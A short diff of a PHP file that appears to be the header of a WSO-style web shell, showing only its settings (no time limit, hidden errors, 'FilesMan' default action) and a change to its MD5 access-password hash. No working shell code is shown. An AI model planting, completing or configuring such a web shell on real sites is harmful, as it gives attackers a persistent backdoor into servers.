@@ -9,7 +9,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$auth_pass = "54af5ac183c3cdfba9fed2d2a5a0d7bf"; //  apa hayo?
+$auth_pass = "0ac6cd34e2fac333bf0ee3cd06bdcf96"; //  apa hayo?
 $color = "#00ff00";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
